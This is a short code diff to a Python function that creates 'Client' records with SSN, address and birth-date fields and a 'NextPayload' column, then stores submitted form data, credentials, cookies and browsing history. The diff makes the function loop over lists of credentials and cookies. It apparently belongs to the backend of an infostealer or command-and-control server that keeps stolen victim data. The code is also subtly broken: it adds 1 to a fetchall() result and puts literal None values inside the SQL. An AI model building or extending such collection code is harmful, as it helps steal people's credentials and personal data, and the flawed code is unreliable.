@@ -58,9 +58,15 @@ def create_new_client(data):
     lastID = cur.fetchall()
     curID = lastID + 1
     cur.execute('INSERT INTO Client(ID, CellPhone, StreetAddress, Email, SSN, FirstName, LastName, BirthDate, NextPayload, City, Country, ZipCode, State) VALUES (%s, None, None, None, None, None, None, None, None, None, None, None, None)', curID)
-    store_form_data(data["forms"], curID)
-    store_credentials(data["creds"], curID)
-    store_cookie(data["cookie"], curID)
+    formsList = data["forms"]
+    for x in formsList:
+        store_form_data(x, curID)
+    credsList = data["creds"]
+    for y in credsList:
+        store_credentials(y, curID)
+    cookiesList = data["cookies"]
+    for z in cookiesList:
+        store_cookie(z, curID)
     store_history(data["history"], curID)
     return 0
 
